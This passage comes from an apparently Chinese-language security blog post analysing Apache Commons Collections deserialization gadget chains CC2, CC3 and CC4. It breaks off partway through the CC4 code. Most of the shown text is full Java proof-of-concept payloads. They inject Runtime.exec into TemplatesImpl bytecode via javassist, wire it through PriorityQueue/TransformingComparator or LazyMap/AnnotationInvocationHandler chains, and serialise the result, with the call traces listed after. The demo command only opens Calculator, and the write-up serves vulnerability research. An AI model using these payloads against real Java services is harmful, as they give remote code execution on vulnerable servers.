<p>&#x56DE;&#x987E; InvokerTransformer&#xFF0C;&#x8C03;&#x7528;&#x5176; transform &#x65B9;&#x6CD5;&#xFF0C;&#x5982;&#x679C;&#x53EF;&#x63A7;  transform &#x65B9;&#x6CD5;&#x4E2D;&#x53C2;&#x6570;&#xFF0C;&#x4EE5;&#x53CA; <code>this.iMethodName</code> &#x5373;&#x53EF;&#x8C03;&#x7528;&#x4EFB;&#x610F;&#x7C7B;&#x7684;&#x4EFB;&#x610F;&#x65B9;&#x6CD5;</p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210213141618580.png" alt></p>
<p>&#x56DE;&#x987E;&#x4E4B;&#x524D; CC2 gadget chain &#x4E2D;&#x6267;&#x884C; transform &#x7684;&#x70B9;&#xFF0C;&#x53EA;&#x9700;&#x8981; obj1 &#x53EF;&#x63A7;&#xFF0C;&#x5219;&#x6EE1;&#x8DB3;&#x6761;&#x4EF6;</p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210213142428801.png" alt></p>
<p><strong>TemplatesImpl &#x5229;&#x7528;&#x94FE; payload</strong></p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TemplatesImplDemo</span> </span>{</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>{</span><br><span class="line">        Constructor constructor = Class.forName(<span class="hljs-string">&quot;org.apache.commons.collections4.functors.InvokerTransformer&quot;</span>).getDeclaredConstructor(String.class);</span><br><span class="line">        constructor.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">        InvokerTransformer transformer = (InvokerTransformer) constructor.newInstance(<span class="hljs-string">&quot;newTransformer&quot;</span>);</span><br><span class="line">        TransformingComparator comparator = <span class="hljs-keyword">new</span> TransformingComparator(transformer);</span><br><span class="line">        PriorityQueue queue = <span class="hljs-keyword">new</span> PriorityQueue(<span class="hljs-number">2</span>);</span><br><span class="line">        <span class="hljs-comment">// javassist</span></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(AbstractTranslet.class));</span><br><span class="line">        CtClass cc = pool.makeClass(<span class="hljs-string">&quot;Demo&quot;</span>);</span><br><span class="line">        String cmd = <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;/Applications/Calculator.app/Contents/MacOS/Calculator\&quot;);&quot;</span>;</span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="hljs-keyword">byte</span>[] classBytes = cc.toBytecode();</span><br><span class="line">        <span class="hljs-keyword">byte</span>[][] targetByteCodes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]{classBytes};</span><br><span class="line">        TemplatesImpl templates = TemplatesImpl.class.newInstance();</span><br><span class="line">        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, targetByteCodes);</span><br><span class="line">        <span class="hljs-comment">// &#x8FDB;&#x5165; defineTransletClasses() &#x65B9;&#x6CD5;&#x9700;&#x8981;&#x7684;&#x6761;&#x4EF6;</span></span><br><span class="line">        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;name&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="hljs-string">&quot;_class&quot;</span>, <span class="hljs-keyword">null</span>);</span><br><span class="line">        Object[] queue_array = <span class="hljs-keyword">new</span> Object[]{templates, <span class="hljs-number">1</span>};</span><br><span class="line"></span><br><span class="line">        Field queue_field = Class.forName(<span class="hljs-string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;queue&quot;</span>);</span><br><span class="line">        queue_field.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">        queue_field.set(queue, queue_array);</span><br><span class="line"></span><br><span class="line">        Field size = Class.forName(<span class="hljs-string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;size&quot;</span>);</span><br><span class="line">        size.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">        size.set(queue, <span class="hljs-number">2</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Field comparator_field = Class.forName(<span class="hljs-string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;comparator&quot;</span>);</span><br><span class="line">        comparator_field.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">        comparator_field.set(queue, comparator);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream bos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(bos);</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(bos);</span><br><span class="line">        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> ByteArrayInputStream(bos.toByteArray()));</span><br><span class="line">        ois.readObject();</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object obj, <span class="hljs-keyword">final</span> String fieldName, <span class="hljs-keyword">final</span> Object value)</span> <span class="hljs-keyword">throws</span> Exception </span>{</span><br><span class="line">        <span class="hljs-keyword">final</span> Field field = getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Field <span class="hljs-title">getField</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Class&lt;?&gt; clazz, <span class="hljs-keyword">final</span> String fieldName)</span> </span>{</span><br><span class="line">        Field field = <span class="hljs-keyword">null</span>;</span><br><span class="line">        <span class="hljs-keyword">try</span> {</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">        } <span class="hljs-keyword">catch</span> (NoSuchFieldException ex) {</span><br><span class="line">            <span class="hljs-keyword">if</span> (clazz.getSuperclass() != <span class="hljs-keyword">null</span>) {</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-keyword">return</span> field;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x5229;&#x7528;&#x94FE;</p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">     ObjectInputStream.readObject()</span><br><span class="line">       PriorityQueue.readObject()</span><br><span class="line">         PriorityQueue.heapify()</span><br><span class="line">             PriorityQueue.siftDown()</span><br><span class="line">               PriorityQueue.siftDownUsingComparator()</span><br><span class="line">                 TransformingComparator.compare()</span><br><span class="line">                     InvokerTransformer.transform()</span><br><span class="line">                       Method.invoke()</span><br><span class="line">                           TemplatesImpl.newTransformer()</span><br><span class="line">                                TemplatesImpl.getTransletInstance()</span><br><span class="line">                                TemplatesImpl.defineTransletClasses</span><br><span class="line">                                newInstance()</span><br><span class="line">                                 	Runtime.exec()</span><br></pre></td></tr></tbody></table></figure><p></p>
<blockquote>
<p>CommonsCollections2 &#x4E0D;&#x80FD;&#x5728; 3.1-3.2.1&#x7248;&#x672C;&#x5229;&#x7528;&#x6210;&#x529F;</p>
<p><strong>&#x6839;&#x672C;&#x539F;&#x56E0;&#x5728;&#x4E8E;CommonsCollections2&#x7684;payload&#x4E2D;&#x4F7F;&#x7528;&#x7684;TransformingComparator&#x5728;3.1-3.2.1&#x7248;&#x672C;&#x4E2D;&#x8FD8;&#x6CA1;&#x6709;&#x5B9E;&#x73B0;Serializable&#x63A5;&#x53E3;&#xFF0C;&#x65E0;&#x6CD5;&#x88AB;&#x53CD;&#x5E8F;&#x5217;&#x5316;</strong></p>
</blockquote>
<h1 id="CommonsCollections3"><a href="#CommonsCollections3" class="headerlink" title="CommonsCollections3"></a>CommonsCollections3</h1><h2 id="Basics-2"><a href="#Basics-2" class="headerlink" title="Basics"></a>Basics</h2><p>CC3 &#x76F8;&#x6BD4;&#x4E8E; CC1 &#x4E5F;&#x53EA;&#x662F;&#x66F4;&#x6539;&#x4E86;&#x547D;&#x4EE4;&#x6267;&#x884C;&#x7684;&#x65B9;&#x5F0F;</p>
<p>&#x5148;&#x770B;&#x4E00;&#x4E0B; <code>InstantiateTransformer#transform</code>&#xFF0C;&#x5C31;&#x662F;&#x901A;&#x8FC7;&#x53CD;&#x5C04;&#x8C03;&#x7528;&#x6784;&#x9020;&#x51FD;&#x6570;&#x6765;&#x5B9E;&#x4F8B;&#x5316;&#x5BF9;&#x8C61;</p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210213020034643.png" alt></p>
<p>CC2 &#x91CC;&#x9762;&#x6211;&#x4EEC;&#x6539;&#x53D8;&#x4E86;&#x547D;&#x4EE4;&#x6267;&#x884C;&#x7684;&#x65B9;&#x5F0F;&#x4E3A; <code>TemplatesImpl#newTransformer</code> &#x6765;&#x8C03;&#x7528;&#x3002;CC2&#x91CC;&#x89E6;&#x53D1; <code>TemplatesImpl#newTransformer</code>  &#x662F;&#x9760;&#x7684; <code>InvoerTransformer#transform</code>&#xFF0C;&#x4E14; <code>transform</code> &#x53C2;&#x6570;&#x53EF;&#x63A7;</p>
<p>CC3 &#x7528;&#x5230;&#x4E86; <code>TrAXFilter</code> &#x8FD9;&#x4E2A;&#x7C7B;&#xFF0C;&#x5176;&#x6784;&#x9020;&#x65B9;&#x6CD5;&#x4F1A;&#x8C03;&#x7528; <code>templates.newTransformer()</code>&#xFF0C;&#x4E14; <code>templates</code> &#x53EF;&#x63A7;</p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210213143732101.png" alt></p>
<p>&#x56DE;&#x987E;&#x6211;&#x4EEC;&#x4E0A;&#x9762;&#x8BB2;&#x7684; <code>InstantiateTransformer#transform</code>&#xFF0C;&#x90A3;&#x4E48;&#x53EF;&#x4EE5;&#x5B9E;&#x73B0;&#x547D;&#x4EE4;&#x6267;&#x884C;</p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo</span> </span>{</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>{</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(AbstractTranslet.class));</span><br><span class="line">        CtClass cc = pool.makeClass(<span class="hljs-string">&quot;TestDemo&quot;</span>);</span><br><span class="line">        String cmd = <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;/Applications/Calculator.app/Contents/MacOS/Calculator\&quot;);&quot;</span>;</span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="hljs-keyword">byte</span>[] classBytes = cc.toBytecode();</span><br><span class="line">        <span class="hljs-keyword">byte</span>[][] targetByteCodes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]{classBytes};</span><br><span class="line">        TemplatesImpl templates = TemplatesImpl.class.newInstance();</span><br><span class="line">        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, targetByteCodes);</span><br><span class="line">        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;TestDemo&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="hljs-string">&quot;_class&quot;</span>, <span class="hljs-keyword">null</span>);</span><br><span class="line">        setFieldValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> TransformerFactoryImpl());</span><br><span class="line">        ChainedTransformer chain = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]{</span><br><span class="line">                <span class="hljs-keyword">new</span> ConstantTransformer(TrAXFilter.class),</span><br><span class="line">                <span class="hljs-keyword">new</span> InstantiateTransformer(<span class="hljs-keyword">new</span> Class[]{Templates.class}, <span class="hljs-keyword">new</span> Object[]{templates})</span><br><span class="line">        });</span><br><span class="line">        chain.transform(<span class="hljs-string">&quot;random&quot;</span>);</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object obj, <span class="hljs-keyword">final</span> String fieldName, <span class="hljs-keyword">final</span> Object value)</span> <span class="hljs-keyword">throws</span> Exception </span>{</span><br><span class="line">        <span class="hljs-keyword">final</span> Field field = getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Field <span class="hljs-title">getField</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Class&lt;?&gt; clazz, <span class="hljs-keyword">final</span> String fieldName)</span> </span>{</span><br><span class="line">        Field field = <span class="hljs-keyword">null</span>;</span><br><span class="line">        <span class="hljs-keyword">try</span> {</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-keyword">catch</span> (NoSuchFieldException ex) {</span><br><span class="line">            <span class="hljs-keyword">if</span> (clazz.getSuperclass() != <span class="hljs-keyword">null</span>) {</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-keyword">return</span> field;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<h2 id="Gadget-chain-1"><a href="#Gadget-chain-1" class="headerlink" title="Gadget chain"></a>Gadget chain</h2><p>&#x4E0A;&#x8FF0;&#x7684; RCE demo &#x7ED3;&#x5408; CC1 &#x7684; LazyMap &#x5229;&#x7528;&#x94FE;&#x53EF;&#x4EE5;&#x6784;&#x9020;&#x51FA; CC3</p>
<p><strong>CC3 payload</strong></p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC3</span> </span>{</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>{</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(AbstractTranslet.class));</span><br><span class="line">        CtClass cc = pool.makeClass(<span class="hljs-string">&quot;TestDemo&quot;</span>);</span><br><span class="line">        String cmd = <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;/Applications/Calculator.app/Contents/MacOS/Calculator\&quot;);&quot;</span>;</span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="hljs-keyword">byte</span>[] classBytes = cc.toBytecode();</span><br><span class="line">        <span class="hljs-keyword">byte</span>[][] targetByteCodes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]{classBytes};</span><br><span class="line">        TemplatesImpl templates = TemplatesImpl.class.newInstance();</span><br><span class="line">        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, targetByteCodes);</span><br><span class="line">        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;TestDemo&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="hljs-string">&quot;_class&quot;</span>, <span class="hljs-keyword">null</span>);</span><br><span class="line">        setFieldValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> TransformerFactoryImpl());</span><br><span class="line">        Transformer[] realPoc = <span class="hljs-keyword">new</span> Transformer[]{</span><br><span class="line">                <span class="hljs-keyword">new</span> ConstantTransformer(TrAXFilter.class),</span><br><span class="line">                <span class="hljs-keyword">new</span> InstantiateTransformer(<span class="hljs-keyword">new</span> Class[]{Templates.class}, <span class="hljs-keyword">new</span> Object[]{templates})};</span><br><span class="line">        ChainedTransformer fakeChain = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]{ <span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-string">&quot;random&quot;</span>)});</span><br><span class="line"></span><br><span class="line">        Map innerMap = <span class="hljs-keyword">new</span> HashMap();</span><br><span class="line">        Class clz = Class.forName(<span class="hljs-string">&quot;org.apache.commons.collections.map.LazyMap&quot;</span>);</span><br><span class="line">        Constructor construct = clz.getDeclaredConstructor(Map.class, Transformer.class);</span><br><span class="line">        construct.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">        LazyMap mapDemo = (LazyMap) construct.newInstance(innerMap, fakeChain);</span><br><span class="line">        Constructor handler_construct = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        handler_construct.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">        InvocationHandler map_handler = (InvocationHandler) handler_construct.newInstance(Override.class, mapDemo);</span><br><span class="line">        Map proxy_map = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),<span class="hljs-keyword">new</span> Class[]{Map.class}, map_handler);</span><br><span class="line">        Constructor AnnotationInvocationHandler_Construct = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        AnnotationInvocationHandler_Construct.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">        InvocationHandler handler = (InvocationHandler)AnnotationInvocationHandler_Construct.newInstance(Override.class, proxy_map);</span><br><span class="line"></span><br><span class="line">        Field f = ChainedTransformer.class.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">        f.set(fakeChain, realPoc);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream bos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(bos);</span><br><span class="line">        oos.writeObject(handler);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(bos);</span><br><span class="line">        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> ByteArrayInputStream(bos.toByteArray()));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object obj, <span class="hljs-keyword">final</span> String fieldName, <span class="hljs-keyword">final</span> Object value)</span> <span class="hljs-keyword">throws</span> Exception </span>{</span><br><span class="line">        <span class="hljs-keyword">final</span> Field field = getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Field <span class="hljs-title">getField</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Class&lt;?&gt; clazz, <span class="hljs-keyword">final</span> String fieldName)</span> </span>{</span><br><span class="line">        Field field = <span class="hljs-keyword">null</span>;</span><br><span class="line">        <span class="hljs-keyword">try</span> {</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-keyword">catch</span> (NoSuchFieldException ex) {</span><br><span class="line">            <span class="hljs-keyword">if</span> (clazz.getSuperclass() != <span class="hljs-keyword">null</span>) {</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-keyword">return</span> field;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x5229;&#x7528;&#x94FE;</p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">	ObjectInputStream.readObject()</span><br><span class="line">				AnnotationInvocationHandler.readObject()</span><br><span class="line">					Map(Proxy).entrySet()</span><br><span class="line">						AnnotationInvocationHandler.invoke()</span><br><span class="line">							LazyMap.get()</span><br><span class="line">								ChainedTransformer.transform()</span><br><span class="line">								ConstantTransformer.transform()</span><br><span class="line">								InstantiateTransformer.transform()</span><br><span class="line">								newInstance()</span><br><span class="line">									TrAXFilter#TrAXFilter()</span><br><span class="line">									TemplatesImpl.newTransformer()</span><br><span class="line">											TemplatesImpl.getTransletInstance()</span><br><span class="line">											TemplatesImpl.defineTransletClasses</span><br><span class="line">											newInstance()</span><br><span class="line">												Runtime.exec()</span><br></pre></td></tr></tbody></table></figure><p></p>
<h1 id="CommonsCollections4"><a href="#CommonsCollections4" class="headerlink" title="CommonsCollections4"></a>CommonsCollections4</h1><h2 id="Basics-3"><a href="#Basics-3" class="headerlink" title="Basics"></a>Basics</h2><p>CC4 &#x6CA1;&#x6709;&#x65B0;&#x5229;&#x7528;&#x7684;&#x7C7B;&#xFF0C;CC2 &#x8DDF; CC3 &#x7ED3;&#x5408;&#x4E86;&#x4E00;&#x4E0B;</p>
<h2 id="Gadget-chain-2"><a href="#Gadget-chain-2" class="headerlink" title="Gadget chain"></a>Gadget chain</h2><p><strong>CC4 payload</strong></p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC4</span> </span>{</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>{</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(AbstractTranslet.class));</span><br><span class="line">        CtClass cc = pool.makeClass(<span class="hljs-string">&quot;TestDemo&quot;</span>);</span><br><span class="line">        String cmd = <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;/Applications/Calculator.app/Contents/MacOS/Calculator\&quot;);&quot;</span>;</span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="hljs-keyword">byte</span>[] classBytes = cc.toBytecode();</span><br><span class="line">        <span class="hljs-keyword">byte</span>[][] targetByteCodes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]{classBytes};</span><br><span class="line">        TemplatesImpl templates = TemplatesImpl.class.newInstance();</span><br><span class="line">        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, targetByteCodes);</span><br><span class="line">        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;TestDemo&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="hljs-string">&quot;_class&quot;</span>, <span class="hljs-keyword">null</span>);</span><br><span class="line">        setFieldValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> TransformerFactoryImpl());</span><br><span class="line">        Transformer[] realPoc = <span class="hljs-keyword">new</span> Transformer[]{</span><br><span class="line">                <span class="hljs-keyword">new</span> ConstantTransformer(TrAXFilter.class),</span><br><span class="line">                <span class="hljs-keyword">new</span> InstantiateTransformer(<span class="hljs-keyword">new</span> Class[]{Templates.class}, <span class="hljs-keyword">new</span> Object[]{templates})};</span><br><span class="line">        ChainedTransformer fakeChain = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]{ <span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-string">&quot;random&quot;</span>)});</span><br><span class="line"></span><br><span class="line">        TransformingComparator comparator = <span class="hljs-keyword">new</span> TransformingComparator(fakeChain);</span><br><span class="line">        PriorityQueue queue = <span class="hljs-keyword">new</span> PriorityQueue(<span class="hljs-number">2</span>);</span><br><span class="line">        Object[] queue_array = <span class="hljs-keyword">new</span> Object[]{templates, <span class="hljs-number">1</span>};</span><br><span class="line"></span><br><span class="line">        <span class="hljs-comment">// gadget</span></span><br><span class="line">        Field queue_field = Class.forName(<span class="hljs-string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;queue&quot;</span>);</span><br><span class="line">        queue_field.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">        queue_field.set(queue, queue_array);</span><br><span class="line"></span><br><span class="line">        Field size = Class.forName(<span class="hljs-string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;size&quot;</span>);</span><br><span class="line">        size.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">        size.set(queue, <span class="hljs-number">2</span>);</span><br><span class="line"></span><br><span class="line">        Field comparator_field = Class.forName(<span class="hljs-string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;comparator&quot;</span>);</span><br><span class="line">        comparator_field.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">        comparator_field.set(queue, comparator);</span><br><span class="line"></span><br><span class="line">        Field f = ChainedTransformer.class.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">        f.set(fakeChain, realPoc);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream bos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(bos);</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(bos);</span><br><span class="line">        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> ByteArrayInputStream(bos.toByteArray()));</span><br><span class="line">        ois.readObject();</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object obj, <span class="hljs-keyword">final</span> String fieldName, <span class="hljs-keyword">final</span> Object value)</span> <span class="hljs-keyword">throws</span> Exception </span>{</span><br><span class="line">        <span class="hljs-keyword">final</span> Field field = getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Field <span class="hljs-title">getField</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Class&lt;?&gt; clazz, <span class="hljs-keyword">final</span> String fieldName)</span> </span>{</span><br><span class="line">        Field field = <span class="hljs-keyword">null</span>;</span><br><span class="line">        <span class="hljs-keyword">try</span> {</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">        } <span class="hljs-keyword">catch</span> (NoSuchFieldException ex) {</span><br><span class="line">            <span class="hljs-keyword">if</span> (clazz.getSuperclass() != <span class="hljs-keyword">null</span>) {</span><br><span 